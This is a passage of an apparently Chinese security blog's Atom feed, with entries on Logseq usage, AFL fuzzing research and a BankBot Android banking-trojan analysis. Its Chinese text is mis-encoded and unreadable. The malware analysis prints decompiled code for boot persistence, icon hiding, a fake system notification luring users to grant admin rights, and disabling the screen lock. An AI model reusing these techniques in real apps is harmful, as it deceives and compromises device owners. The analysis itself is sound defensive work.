    <category term="Programming" scheme="http://usmacd.com/tags/Programming/"/>
    
  </entry>
  
  <entry>
    <title>Logseq ä½¿ç”¨å°ç»“ ï¼ˆäºŒï¼‰</title>
    <link href="http://usmacd.com/2022/03/07/logseq2/"/>
    <id>http://usmacd.com/2022/03/07/logseq2/</id>
    <published>2022-03-07T04:20:11.870Z</published>
    <updated>2022-03-07T04:20:11.870Z</updated>
    
    <content type="html"><![CDATA[<p>ç”¨äº† Logseq ä¸€æ®µæ—¶é—´äº†ï¼Œåšä¸ªç®€å•çš„æ€»ç»“ï¼Œå›½å†…çš„å¾ˆå¤šæ–‡ç« ï¼Œåœ¨æˆ‘çœ‹æ¥è¿˜æ˜¯ä¸å¤Ÿç®€å•æ˜äº†, æœ¬æ–‡å¤§è‡´ä»‹ç»äº† Logseq æ¯”è¾ƒå¸¸ç”¨çš„ä¸€äº›åŠŸèƒ½çš„ä½¿ç”¨ã€‚</p><h2 id="Flashcards"><a href="#Flashcards" class="headerlink" title="Flashcards"></a>Flashcards</h2><p>å¯ä»¥æŠŠè®°å½•çš„çŸ¥è¯†ç‚¹å½“ä½œå¡ç‰‡æ¥è®°å¿†ï¼Œç”¨è¿‡ Anki çš„åŒå­¦ï¼Œåº”è¯¥éƒ½æ¯”è¾ƒç†Ÿæ‚‰äº†ï¼Œä½¿ç”¨çš„è®°å¿†ç®—æ³•ä¸º <a href="https://www.supermemo.com/en/archives1990-2015/english/ol/sm5">SM-5</a><br>è¦å°†ä¸€ä¸ª block è®°ä¸ºå¡ç‰‡éå¸¸ç®€å•ï¼Œä½¿ç”¨ <code>#card</code> æ ‡ç­¾å°±å¯ä»¥äº†ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq5.png"></p><h3 id="å¡ç‰‡ç»„"><a href="#å¡ç‰‡ç»„" class="headerlink" title="å¡ç‰‡ç»„"></a>å¡ç‰‡ç»„</h3><p>æœ‰äº›å¡ç‰‡å¯èƒ½æ˜¯å½’å±åŒä¸€ä¸ªå¤§ç±»ï¼Œè¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨å¡ç‰‡ç»„äº†ã€‚åƒæˆ‘ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œè¦è®°å¿†çš„å•è¯éƒ½åœ¨ <code>è‹±è¯­å•è¯ç§¯ç´¯</code>ä¸‹ï¼Œå°±å¯ä»¥ä½¿ç”¨è¯­æ³• <code>&#123;&#123;cards è‹±è¯­å•è¯ç§¯ç´¯&#125;&#125;</code> æ•ˆæœå¦‚ä¸‹å›¾ï¼Œ<br>å¯ä»¥çœ‹å‡ºæˆ‘å·²ç»ç§¯ç´¯äº†7å¼ å¡ç‰‡äº†ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq6.png"></p><p>è¦èƒŒè¯µéœ€è¦è®°å¿†çš„å¡ç‰‡æ—¶ï¼Œå•å‡»å·¦ä¾§çš„ Flashcards å°±å¯ä»¥äº†ï¼Œä½¿ç”¨æ–¹é¢æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ï¼Œæœ‰ä¸‰ä¸ªé€‰é¡¹å¯ä»¥é€‰æ‹©ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq7.png"></p><h2 id="theme-ï¼ˆçš®è‚¤ï¼‰"><a href="#theme-ï¼ˆçš®è‚¤ï¼‰" class="headerlink" title="theme ï¼ˆçš®è‚¤ï¼‰"></a>theme ï¼ˆçš®è‚¤ï¼‰</h2><p>çš®è‚¤å°±æ˜¯é’èœèåœå„æœ‰æ‰€çˆ±äº†ï¼Œæ¨èä¸¤æ¬¾æˆ‘è‡ªå·±æ¯”è¾ƒå–œæ¬¢çš„çš„çš®è‚¤ã€‚</p><p><img src="https://github.com/pengx17/logseq-laurel-theme/raw/master/white.png"><br><img src="https://raw.githubusercontent.com/tobealive/logseq-allday-theme/main/preview.png"></p><p>Github ä»“åº“åœ°å€å¦‚ä¸‹ï¼š</p><p><a href="https://github.com/pengx17/logseq-laurel-theme">https://github.com/pengx17/logseq-laurel-theme</a><br><a href="https://github.com/tobealive/logseq-allday-theme">https://github.com/tobealive/logseq-allday-theme</a></p><p>æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥è®¾ç½®çš®è‚¤ï¼š</p><ul><li>custom.css</li><li>plugin system</li></ul><p>ä½¿ç”¨ custom.cssï¼Œæ‰“å¼€ Settings -&gt;     General -&gt;  Custom theme  ç‚¹å‡» <code>custom.css</code> å¤åˆ¶ css å†…å®¹ï¼Œä¿å­˜é€€å‡ºå³å¯ã€‚<br>ä½¿ç”¨æ’ä»¶ç³»ç»Ÿï¼Œåˆ™éœ€è¦å…ˆæŠŠæ’ä»¶ç³»ç»Ÿæ‰“å¼€ï¼ŒSettings  -&gt;  Advanced -&gt; Plug-in system ã€‚æ‰“å¼€æ’ä»¶ç³»ç»Ÿåï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨<br>Plugins -&gt; Marketplace -&gt; themes é€‰æ‹©ä½ å–œæ¬¢çš„ theme ç‚¹å‡» <code>Install</code> å°±å¯ä»¥äº†</p><p>ä¸è¿‡è¿˜æ˜¯æ¨èä½¿ç”¨ Logseq è‡ªå¸¦çš„æ’ä»¶ç®¡ç†ç³»ç»Ÿæ¥å®‰è£…ï¼Œå¯ä»¥è‡ªåŠ¨å‡çº§æ¯”è¾ƒæ–¹ä¾¿ï¼Œåˆ‡æ¢çš®è‚¤å¯ä»¥ç‚¹å‡»å³ä¸Šè§’ ä¸‰ä¸ªç‚¹ -&gt; Themes é€‰æ‹©çš®è‚¤ã€‚ </p><h2 id="plugin-ï¼ˆæ’ä»¶ï¼‰"><a href="#plugin-ï¼ˆæ’ä»¶ï¼‰" class="headerlink" title="plugin ï¼ˆæ’ä»¶ï¼‰"></a>plugin ï¼ˆæ’ä»¶ï¼‰</h2><p>ä½¿ç”¨ Logseq æ’ä»¶åŒæ ·æ˜¯ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li>plugin system</li><li>Load unpacked plugin</li></ul><p>ä½¿ç”¨æ’ä»¶ç³»ç»Ÿçš„æ–¹æ³•å’Œä¸Šé¢å®‰è£…çš®è‚¤çš„æ­¥éª¤å¤§è‡´ç›¸åŒï¼Œä¾æ¬¡ç‚¹å‡» Plugins -&gt; Marketplace -&gt; Plugins ï¼Œé€‰æ‹©æ’ä»¶ç‚¹å‡» <code>Install</code> å³å¯ã€‚è¦åŠ è½½ <code>unpacked plugin</code> é¦–å…ˆè¦æ‰“å¼€å¼€å‘è€…æ¨¡å¼ Settings  -&gt;  Advanced -&gt; Developer mode ,  è®¾ç½®ä¸ºæ‰“å¼€ã€‚æ‰“å¼€åä½¿ç”¨æ’ä»¶ç®¡ç†ç³»ç»Ÿ Plugins -&gt; Installed -&gt; Load unpacked plugin é€‰æ‹©ç›¸å…³ç›®å½•å°±å¯ä»¥äº†ã€‚</p><p>å…·ä½“çš„æ’ä»¶å¯ä»¥å‚è€ƒ <a href="https://github.com/logseq/awesome-logseq#Plugins">https://github.com/logseq/awesome-logseq#Plugins</a> è®°å½•çš„æ’ä»¶éƒ½æŒºä¸é”™çš„ã€‚</p><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ’ä»¶ç³»ç»Ÿçš„ç½‘ç»œä¸å¤ªç¨³å®šï¼ˆæ€»æ‰€å‘¨çŸ¥çš„åŸå› ï¼‰ï¼Œä½¿ç”¨ä»£ç†ä¼šæ–¹ä¾¿ä¸€äº›ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https_proxy=127.0.0.1:3128 ./Logseq --proxy-server=http://127.0.0.1:3128</span><br></pre></td></tr></table></figure><p>å®‰è£…æ’ä»¶å¯èƒ½ä¼šå‡ºç° timeout é”™è¯¯ï¼Œå¤šé‡è¯•å‡ æ¬¡å°±åº”è¯¥å¯ä»¥å®‰è£…ä¸Šäº†ã€‚</p><h2 id="query"><a href="#query" class="headerlink" title="query"></a>query</h2><p>query ç®—æ˜¯ Logseq çš„é«˜çº§åŠŸèƒ½äº†ï¼Œæˆ‘ç”¨çš„ä¹Ÿä¸å¤šï¼Œè¾“å…¥ <code>/query</code> å›è½¦å°±å¯ä»¥è‡ªåŠ¨è¿›å…¥ query äº†ï¼Œå…·ä½“çš„è¯­æ³•å¾ˆçµæ´»å¯ä»¥å‚è€ƒï¼š<br><a href="https://logseq.github.io/#/page/queries">https://logseq.github.io/#/page/queries</a></p><p>æ²¹ç®¡ä¸Šæœ‰ç›¸å…³ videoï¼Œå¤§å®¶å¯ä»¥å‚è€ƒä¸€ä¸‹ï¼š<br><a href="https://www.youtube.com/watch?v=GDauxjx_bdA&amp;ab_channel=OneStutteringMind">https://www.youtube.com/watch?v=GDauxjx_bdA&amp;ab_channel=OneStutteringMind</a><br><a href="https://www.youtube.com/watch?v=qQ8DzumRZkM&amp;ab_channel=OneStutteringMind">https://www.youtube.com/watch?v=qQ8DzumRZkM&amp;ab_channel=OneStutteringMind</a></p><h2 id="å†™åœ¨åé¢çš„è¯"><a href="#å†™åœ¨åé¢çš„è¯" class="headerlink" title="å†™åœ¨åé¢çš„è¯"></a>å†™åœ¨åé¢çš„è¯</h2><p>Logseq çš„åŠŸèƒ½è¿˜æ˜¯æŒºå¤šçš„ï¼Œä¸¤ç¯‡æ–‡ç« ä¹Ÿä¸å¯èƒ½å…¨éƒ¨ä»‹ç»å®Œï¼Œå®˜æ–¹æ–‡æ¡£æ€»æ˜¯æœ€å¥½çš„èµ„æ–™ï¼š<a href="https://logseq.github.io/#/page/Contents">https://logseq.github.io/#/page/Contents</a></p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://logseq.github.io/">https://logseq.github.io</a><br><a href="https://www.usmacd.com/2022/02/21/logseq/">https://www.usmacd.com/2022/02/21/logseq/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ç”¨äº† Logseq ä¸€æ®µæ—¶é—´äº†ï¼Œåšä¸ªç®€å•çš„æ€»ç»“ï¼Œå›½å†…çš„å¾ˆå¤šæ–‡ç« ï¼Œåœ¨æˆ‘çœ‹æ¥è¿˜æ˜¯ä¸å¤Ÿç®€å•æ˜äº†, æœ¬æ–‡å¤§è‡´ä»‹ç»äº† Logseq æ¯”è¾ƒå¸¸ç”¨çš„ä¸€äº›åŠŸèƒ½çš„ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;h2 id=&quot;Flashcards&quot;&gt;&lt;a href=&quot;#Flashcards&quot; class=&quot;headerlin</summary>
      
    
    
    
    
    <category term="Software" scheme="http://usmacd.com/tags/Software/"/>
    
  </entry>
  
  <entry>
    <title>Dissecting American Fuzzy Lop A FuzzBench Evaluation è¦ç‚¹</title>
    <link href="http://usmacd.com/2022/03/04/afl-fuzz1/"/>
    <id>http://usmacd.com/2022/03/04/afl-fuzz1/</id>
    <published>2022-03-04T02:14:45.775Z</published>
    <updated>2022-03-04T02:14:45.775Z</updated>
    
    <content type="html"><![CDATA[<p>paper: <a href="https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf">https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf</a></p><h2 id="ä¸¤ä¸ªå®éªŒçš„ç»“è®º-ä¸»è¦åŸºäº-FuzzBench"><a href="#ä¸¤ä¸ªå®éªŒçš„ç»“è®º-ä¸»è¦åŸºäº-FuzzBench" class="headerlink" title="ä¸¤ä¸ªå®éªŒçš„ç»“è®º (ä¸»è¦åŸºäº FuzzBench)"></a>ä¸¤ä¸ªå®éªŒçš„ç»“è®º (ä¸»è¦åŸºäº FuzzBench)</h2><ul><li>Our conclusion after this experiment is that AFL, and follow-ups fuzzers like AFL++, should provide an optionto disable hitcounts. AFL++ provides many different op-tions, and the users are suggested to run an instance of each variant when doing parallel fuzzing, a common use-case in real-world setups. The fact that in our experiments,hitcounts have shown a highly variadic behavior suggests that users should include a variant without hitcounts when doing parallel or ensemble fuzzing like OSS-Fuzz.</li><li>The conclusion we can draw from this experiment is that it would be a mistake to underestimate the impact of the novelty search. In particular, researchers proposing new approaches that also modify this aspect should care-fully evaluate â€“ in isolation â€“ the benefit of a different mechanism to decide if an input is interesting, as AFLâ€™s novelty search provides a strong baseline.</li></ul><h2 id="è®ºæ–‡ä¸­è®¡åˆ’è¦è¯„ä¼°çš„-afl-fuzz-çš„ä¸€äº›æŠ€æœ¯"><a href="#è®ºæ–‡ä¸­è®¡åˆ’è¦è¯„ä¼°çš„-afl-fuzz-çš„ä¸€äº›æŠ€æœ¯" class="headerlink" title="è®ºæ–‡ä¸­è®¡åˆ’è¦è¯„ä¼°çš„ afl-fuzz çš„ä¸€äº›æŠ€æœ¯"></a>è®ºæ–‡ä¸­è®¡åˆ’è¦è¯„ä¼°çš„ afl-fuzz çš„ä¸€äº›æŠ€æœ¯</h2><ul><li><strong>Hitcounts</strong>: Hitcounts are adopted by other fuzzers to-day, but AFL was the first to introduce this concept.Despite its wide adoption, the impact of this optimization (overplain edge coverage) has never been measured in isolation on a large set of targets.</li><li><strong>Novelty search vs. maximization of a fitness</strong>: While AFL considers every new discovered hitcount as interesting, both other early fuzzing solutions and more recent tools instead only consider testcases that maximize a given metricas interesting. For instance, VUZZER uses the sum of all the weights of the executed basic blocks.<ul><li>In this experiment, we benchmark the AFL approach versusa fitness maximization and the combination of the two ap-proaches, as proposed by VUZZER</li><li>We expect the novelty search to outperforms both of the competing algorithms,</li></ul></li><li><strong>Corpus culling</strong>: The prioritization of the small and fast testcases in the AFL corpus selection algorithm trades speed with the fuzzing of more complex testcases that often corresponds to complex program states<ul><li>In this experiment, we want to assess the difference in using the AFL corpus culling mechanism versus using the entire corpus.</li><li>We expect faster growth in coverage over time and,potentially, more bugs triggered in the same time window</li></ul></li><li><strong>Score calculation</strong>: The performance score used to cal-culate how many times to mutate and execute the input in the havoc, and splice stages are derived from many variables,mainly testcase size and execution time<ul><li>In this experiment, we want to measure the delta between the AFL solution and the baseline, represented by a constantand a random score</li></ul></li><li><strong>Corpus scheduling</strong>: The FIFO policy used by AFL is only one of the possible policies that a fuzzer can adopt to select the next testcase<ul><li>Thus, we evaluate AFL versus a modified version that implements the baseline, random selection, and the opposite approach, a LIFO scheduler.</li></ul></li><li><strong>Splicing as stage vs. splicing as mutation</strong>: Splicing refers to the operation that merges two different testcases into a new one<ul><li>We modified the AFL codebase to implement splicing as a mutation operator to compare the two.</li></ul></li><li><strong>Trimming</strong>: Trimming the testcases allows the fuzzer to reduce the size of the input files and consequently give priority to small inputs, under the assumptions that large inputs introduce a slowdown in the execution and the mutations would be less likely to modify an important portion of the binary structure<ul><li>Despite the fact that this algorithm can bring the two important benefits described above, we argue that reducing the size of the testcases could lead to lose state coverage.Additionally, the trimming phase could become a bottleneck for slow targets</li><li>Therefore, in our evaluation we plan tocompare the default version of AFL against a modified one,where we disabled trimming</li></ul></li><li><strong>Collisions</strong>: As explained in section III-F the AFL ap-proach to instrument the source code of the target programs consists of assigning an identifier for each basic block at compile-time.<ul><li>We want to benchmark this feature as the collision-free variant is simpler than the original implementation with pc-guard, raising the question why random identifiers are used in AFL</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;paper: &lt;a href=&quot;https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf&quot;&gt;https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pd</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>Bankbot APK æ ·æœ¬åˆ†æ</title>
    <link href="http://usmacd.com/2022/02/22/BankBot/"/>
    <id>http://usmacd.com/2022/02/22/BankBot/</id>
    <published>2022-02-22T05:35:06.099Z</published>
    <updated>2022-02-22T05:35:06.099Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-æ ·æœ¬æ¦‚å†µ"><a href="#0x00-æ ·æœ¬æ¦‚å†µ" class="headerlink" title="0x00 æ ·æœ¬æ¦‚å†µ"></a>0x00 æ ·æœ¬æ¦‚å†µ</h2><table><thead><tr><th>å­—æ®µ</th><th>å†…å®¹</th></tr></thead><tbody><tr><td>æ ·æœ¬å</td><td>BankBot</td></tr><tr><td>MD5</td><td>3c42c391bec405bb28b28195c2961778</td></tr><tr><td>SHA256</td><td>93b64019ee48177889d908c393703a2a2fe05ca33793c14b175467ce619b1b94</td></tr><tr><td>æ–‡ä»¶ç±»å‹</td><td>APK</td></tr></tbody></table><p>è¿™æ˜¯ä¸€ä¸ªä»¥ç›—çªƒä¿¡ç”¨å¡ç”¨æˆ·å¯†ç ä¸ºä¸»è¦ç›®çš„çš„botã€‚å®‰è£…åæ˜¾ç¤ºä¸ºAndroidå›¾æ ‡ã€‚æ‰“å¼€Appå<br>ä¼šä»¥Androidç³»ç»Ÿæ›´æ–°çš„å½¢å¼ï¼Œè¯±å¯¼ç”¨æˆ·æ“ä½œè¾¾åˆ°å¸¸é©»ç³»ç»Ÿçš„ç›®çš„ã€‚</p><h2 id="0x01-è¡Œä¸ºåˆ†æ"><a href="#0x01-è¡Œä¸ºåˆ†æ" class="headerlink" title="0x01 è¡Œä¸ºåˆ†æ"></a>0x01 è¡Œä¸ºåˆ†æ</h2><h3 id="å¼€æœºè‡ªå¯åŠ¨"><a href="#å¼€æœºè‡ªå¯åŠ¨" class="headerlink" title="å¼€æœºè‡ªå¯åŠ¨"></a>å¼€æœºè‡ªå¯åŠ¨</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.android.market.Autorun&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;999&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.REBOOT&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.QUICKBOOT_POWERON&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.REBOOT&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.QUICKBOOT_POWERON&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Autorun</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.android.market;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Autorun</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Autorun</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(context, Scheduler.class);</span><br><span class="line">        v0.setFlags(<span class="number">0x10000000</span>);</span><br><span class="line">        context.startService(v0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼€æœºå°†å¯åŠ¨ Schedule æœåŠ¡</p><h3 id="Schedule-æœåŠ¡"><a href="#Schedule-æœåŠ¡" class="headerlink" title="Schedule æœåŠ¡"></a>Schedule æœåŠ¡</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> flags, <span class="type">int</span> startId)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    Utils.registerIfNeeded(((Context)<span class="built_in">this</span>));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="built_in">this</span>.getSystemService(<span class="string">&quot;alarm&quot;</span>);</span><br><span class="line">    <span class="type">PendingIntent</span> <span class="variable">v6</span> <span class="operator">=</span> PendingIntent.getBroadcast(((Context)<span class="built_in">this</span>), <span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">Intent</span>(((Context)<span class="built_in">this</span>), </span><br><span class="line">            NetworkController.class), <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">v7</span> <span class="operator">=</span> FileController.fileExists(((Context)<span class="built_in">this</span>), <span class="string">&quot;interval&quot;</span>) ? Integer.parseInt(FileController</span><br><span class="line">            .readFile(((Context)<span class="built_in">this</span>), <span class="string">&quot;interval&quot;</span>)) : <span class="number">0xA</span>;</span><br><span class="line">    ((AlarmManager)v0).setRepeating(<span class="number">0</span>, System.currentTimeMillis() + <span class="number">0x2710</span>, ((<span class="type">long</span>)(v7 * <span class="number">0x3E8</span>)), </span><br><span class="line">            v6);</span><br><span class="line">    <span class="built_in">this</span>.handleCrashes();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Schedule æœåŠ¡ä½¿ç”¨alarm manager æ³¨å†Œä¸€ä¸ªå®šæ—¶ä»»åŠ¡ã€‚è¿™ä¸ªå®šæ—¶ä»»åŠ¡ç”±NetworkControllerå®Œæˆã€‚<br>æ—¶é—´é—´éš”ç”±é…ç½®æ–‡ä»¶intervalå†³å®šã€‚</p><p>com.android.market.FileController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">fileExists</span><span class="params">(Context context, String filename)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), filename).exists();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="éšè—App-å›¾æ ‡"><a href="#éšè—App-å›¾æ ‡" class="headerlink" title="éšè—App å›¾æ ‡"></a>éšè—App å›¾æ ‡</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">hideApp</span><span class="params">(Context context, <span class="type">boolean</span> hide)</span> &#123;</span><br><span class="line">    <span class="type">ComponentName</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(context.getPackageName(), String.valueOf(context.getPackageName())</span><br><span class="line">             + <span class="string">&quot;.MainActivity&quot;</span>);</span><br><span class="line">    <span class="type">PackageManager</span> <span class="variable">v3</span> <span class="operator">=</span> context.getPackageManager();</span><br><span class="line">    <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> hide ? <span class="number">2</span> : <span class="number">1</span>;</span><br><span class="line">    v3.setComponentEnabledSetting(v0, v1, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¼ªé€ çš„ç³»ç»ŸNotification"><a href="#ä¼ªé€ çš„ç³»ç»ŸNotification" class="headerlink" title="ä¼ªé€ çš„ç³»ç»ŸNotification"></a>ä¼ªé€ çš„ç³»ç»ŸNotification</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate();</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">AppCrash</span>().Register(((Context)<span class="built_in">this</span>));</span><br><span class="line">    <span class="type">Notification</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Notification</span>(<span class="number">0x108008A</span>, <span class="string">&quot;Android system requires user action&quot;</span>, System.</span><br><span class="line">            currentTimeMillis());</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>.getApplicationContext(), AdminX.class);</span><br><span class="line">    v1.setAction(<span class="string">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class="line">    v1.setFlags(<span class="number">0x34000000</span>);</span><br><span class="line">    v3.setLatestEventInfo(<span class="built_in">this</span>.getBaseContext(), <span class="string">&quot;Android&quot;</span>, <span class="string">&quot;Android system requires action&quot;</span>, PendingIntent</span><br><span class="line">            .getActivity(((Context)<span class="built_in">this</span>), <span class="number">0</span>, v1, <span class="number">0x8000000</span>));</span><br><span class="line">    v3.flags |= <span class="number">0x62</span>;</span><br><span class="line">    <span class="built_in">this</span>.startForeground(<span class="number">2</span>, v3);</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Helper</span>(<span class="built_in">this</span>).execute(<span class="keyword">new</span> <span class="title class_">Void</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¦ç”¨å±å¹•é”å®š"><a href="#ç¦ç”¨å±å¹•é”å®š" class="headerlink" title="ç¦ç”¨å±å¹•é”å®š"></a>ç¦ç”¨å±å¹•é”å®š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdminX.<span class="built_in">this</span>.getSystemService(<span class="string">&quot;keyguard&quot;</span>).newKeyguardLock(<span class="string">&quot;ANDROID&quot;</span>).disableKeyguard();</span><br></pre></td></tr></table></figure><h3 id="ç¦æ­¢æ‹¨æ‰“æŒ‡å®šå·ç ç”µè¯"><a href="#ç¦æ­¢æ‹¨æ‰“æŒ‡å®šå·ç ç”µè¯" class="headerlink" title="ç¦æ­¢æ‹¨æ‰“æŒ‡å®šå·ç ç”µè¯"></a>ç¦æ­¢æ‹¨æ‰“æŒ‡å®šå·ç ç”µè¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 